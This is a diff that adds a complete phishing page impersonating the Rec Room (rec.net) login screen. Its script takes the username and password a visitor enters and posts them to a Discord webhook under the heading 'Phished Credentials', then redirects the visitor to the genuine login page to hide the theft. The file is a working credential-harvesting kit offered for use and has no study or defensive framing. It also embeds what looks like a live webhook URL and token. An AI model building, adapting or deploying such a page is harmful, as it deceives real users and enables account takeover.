@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Totally Legit Rec Net Login</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .page-login {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 350px;
+    }
+    .recroom-logo {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 200px;
+    }
+    hr {
+      border-top: 1px solid #ccc;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #555;
+    }
+    .form-control {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    button.btn {
+      background-color: #007bff;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      width: 100%;
+      cursor: pointer;
+    }
+    button.btn:hover {
+      background-color: #0056b3;
+    }
+    .text-center {
+      text-align: center;
+    }
+    .checkbox {
+      margin-top: 10px;
+      margin-bottom: 15px;
+    }
+    p {
+      margin-top: 10px;
+      text-align: center;
+    }
+    p a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    p a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-login">
+    <img class="recroom-logo" src="/images/logo_stacked.png" alt="Rec Room Logo" />
+    <hr />
+    <section>
+      <p class="text-center">Log in with your Rec Room Username and Password</p>
+      <form id="loginForm">
+        <div class="form-group">
+          <label for="Input_Username">Username or Email</label>
+          <input class="form-control" placeholder="Username" autofocus type="text" id="Input_Username" required>
+        </div>
+        <div class="form-group">
+          <label for="Input_Password">Password</label>
+          <input class="form-control" type="password" placeholder="Password" id="Input_Password" required>
+        </div>
+        <div class="checkbox">
+          <label>
+            <input type="checkbox" id="Input_RememberMe"> Remember Me?
+          </label>
+        </div>
+        <div class="form-group">
+          <button class="btn" type="submit">Login</button>
+        </div>
+        <div class="form-group text-center">
+          <p><a href="https://rec.net/password/recover">Forgot your password?</a></p>
+          <p><a href="https://rec.net/download">Don't have an account? Download Rec Room.</a></p>
+        </div>
+      </form>
+    </section>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const form = document.getElementById('loginForm');
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const username = document.getElementById('Input_Username').value;
+        const password = document.getElementById('Input_Password').value;
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH';
+
+        const payload = {
+          content: **Phished Credentials**\n**Username:** ${username}\n**Password:** ${password}
+        };
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        })
+        .then(res => {
+          if (!res.ok) {
+            console.error('Failed to send data:', res.status);
+          }
+          window.location.href = 'https://rec.net/login'; // Redirect to real page
+        })
+        .catch(err => {
+          console.error('Error:', err);
+          window.location.href = 'https://rec.net/login';
+        });
+      });
+    });
+  </script>
+</body>
+</html>
